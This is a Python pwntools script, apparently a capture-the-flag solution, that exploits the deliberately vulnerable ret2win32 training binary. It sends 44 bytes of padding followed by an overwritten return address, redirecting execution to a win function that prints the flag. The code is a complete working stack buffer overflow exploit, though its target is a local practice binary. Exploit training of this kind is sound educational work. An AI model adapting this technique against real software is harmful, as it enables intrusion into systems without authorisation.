#!/usr/bin/env python3
"""
ret2win32 Demonstration Exploit
Simple, well-commented version for educational purposes
"""

from pwn import *

# Disable verbose logging for cleaner output
context.log_level = 'error'

def main():
    print("=" * 60)
    print("ret2win32 Exploitation Demonstration")
    print("=" * 60)
    
    # Binary setup
    binary = './ret2win32'
    elf = ELF(binary, checksec=False)
    
    print(f"[*] Target binary: {binary}")
    print(f"[*] Architecture: {elf.arch}")
    
    # Key addresses
    ret2win_addr = 0x0804862c
    print(f"[*] ret2win() function address: {hex(ret2win_addr)}")
    
    # Vulnerability details
    buffer_size = 32
    read_size = 56
    overflow_bytes = read_size - buffer_size
    offset_to_ret = 44
    
    print(f"[*] Buffer size: {buffer_size} bytes")
    print(f"[*] Read size: {read_size} bytes")
    print(f"[*] Overflow: {overflow_bytes} bytes")
    print(f"[*] Offset to return address: {offset_to_ret} bytes")
    
    # Craft payload
    padding = b'A' * offset_to_ret
    new_return_addr = p32(ret2win_addr)
    payload = padding + new_return_addr
    
    print(f"\n[+] Payload construction:")
    print(f"    Padding: {len(padding)} bytes of 'A'")
    print(f"    New return address: {hex(ret2win_addr)}")
    print(f"    Total payload size: {len(payload)} bytes")
    
    # Execute exploit
    print(f"\n[+] Launching exploit...")
    
    try:
        # Start the process
        p = process(binary)
        
        # Send the payload
        p.sendlineafter(b'> ', payload)
        
        # Capture output
        output = p.recvall(timeout=3).decode()
        
        # Display results
        print(f"\n[+] Program output:")
        print("-" * 40)
        print(output)
        print("-" * 40)
        
        # Check if exploit worked
        if "Well done" in output and "flag" in output:
            print("\n[SUCCESS] ✅ Exploit successful! Flag captured!")
        else:
            print("\n[FAILED] ❌ Exploit failed")
            
        p.close()
        
    except Exception as e:
        print(f"\n[ERROR] ❌ Exploit failed with error: {e}")
    
    print("\n" + "=" * 60)
    print("Demonstration complete")
    print("=" * 60)

if __name__ == '__main__':
    main()